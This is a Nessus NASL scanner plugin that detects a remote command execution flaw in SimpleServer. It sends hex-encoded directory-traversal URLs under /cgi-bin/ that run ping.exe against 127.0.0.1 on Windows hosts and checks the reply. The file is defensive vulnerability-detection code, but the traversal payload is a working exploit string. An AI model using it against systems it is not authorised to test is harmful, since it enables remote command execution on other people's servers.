#
# This script was written by Mathieu Meadele <mm@omnix.net>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# (minor changes by rd)
#


if(description)
{
 script_id(10705);
 script_bugtraq_id(3112);
 script_version ("$Revision: 1.13 $");
 name["english"]  = "SimpleServer remote execution";
 name["francais"] = "SimpleServer execution de commandes a distance";

 script_name(english:name["english"], francais:name["francais"]);

 desc["english"] ="
By sending a specially encoded string to the remote server,
it is possible to execute remote commands with the 
privileges of the server.

Solution: Upgrade SimpleServer to version 1.15.
Risk factor : High";

 script_description(english:desc["english"]);

 summary["english"] = "Check the remote execution vulnerability in SimpleServer";

 script_summary(english:summary["english"]);

 script_category(ACT_GATHER_INFO);

 script_copyright(english: "Mathieu Meadele <mm@omnix.net>");

 family["english"]  = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#  we are sending a hexadecimal encoded url, with the cgi-bin prefix,
#  (even if this one doesn't exist), this allowing us to break out the root
#  folder.

#  start here


include("http_func.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if("SimpleServer" >!< banner) exit(0);


 match = "Reply from 127.0.0.1";
 
 strnt = http_get(item:string("/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1"),
	 port:port);

 str9x  = http_get(item:string("/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1"),
	 port:port);
	 

soc = http_open_socket(port);
if(soc) 
{
  send(socket:soc, data:str9x);
  inc1 = http_recv(socket:soc);
  http_close_socket(soc);
  if( match >< inc1 ) {
     security_hole(port);
     exit(0);
     }
}
  
soc = http_open_socket(port);
if(soc)
{
  send(socket:soc, data:strnt);
  inc2 = http_recv(socket:soc);
  http_close_socket(soc);

  if( match >< inc2 ) {
     security_hole(port);
     }
 }

